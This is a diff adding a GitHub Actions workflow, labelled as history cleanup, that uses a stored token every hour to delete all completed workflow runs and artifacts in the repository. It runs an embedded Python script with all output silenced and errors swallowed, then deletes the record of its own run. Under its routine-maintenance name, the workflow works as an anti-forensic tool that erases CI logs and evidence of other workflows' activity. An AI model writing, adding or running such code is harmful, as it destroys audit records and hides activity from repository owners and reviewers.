@@ -1,0 +1,71 @@
+name: Cleanup-Action-History
+
+on:
+  schedule:
+    - cron: '0 * * * *'
+  workflow_dispatch: {}
+
+permissions: {}
+
+concurrency:
+  group: cleanup-action-history
+  cancel-in-progress: false
+
+jobs:
+  cleanup:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Historie und Artefakte bereinigen
+        env:
+          GH_TOKEN: ${{ secrets.SRC_GH_TOKEN }}
+        run: |
+          python3 << 'PYEOF' > /dev/null 2>&1
+          import json, os, urllib.request
+
+          token = os.environ.get("GH_TOKEN")
+          repo = os.environ.get("GITHUB_REPOSITORY")
+          if not token or not repo:
+              raise SystemExit(0)
+
+          headers = {
+              "Authorization": f"token {token}",
+              "Accept": "application/vnd.github+json"
+          }
+
+          def api_get(path):
+              req = urllib.request.Request(f"https://api.github.com/repos/{repo}/{path}?per_page=100", headers=headers)
+              try:
+                  with urllib.request.urlopen(req, timeout=30) as resp:
+                      return json.loads(resp.read().decode("utf-8"))
+              except Exception:
+                  return {}
+
+          def api_delete(path):
+              req = urllib.request.Request(f"https://api.github.com/repos/{repo}/{path}", headers=headers, method="DELETE")
+              try:
+                  with urllib.request.urlopen(req, timeout=30):
+                      pass
+              except Exception:
+                  pass
+
+          runs = api_get("actions/runs").get("workflow_runs", [])
+          curr_run_id = os.environ.get("GITHUB_RUN_ID")
+          for r in runs:
+              rid = str(r.get("id"))
+              if rid != str(curr_run_id) and r.get("status") in ("completed", "failure", "success", "cancelled"):
+                  api_delete(f"actions/runs/{rid}")
+
+          arts = api_get("actions/artifacts").get("artifacts", [])
+          for a in arts:
+              aid = a.get("id")
+              if aid:
+                  api_delete(f"actions/artifacts/{aid}")
+          PYEOF
+
+      - name: Eigenen Lauf nach Abschluss loeschen
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.SRC_GH_TOKEN }}
+        run: |
+          curl -sSfL -X DELETE -H "Authorization: token ${GH_TOKEN}" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}" > /dev/null 2>&1 || true
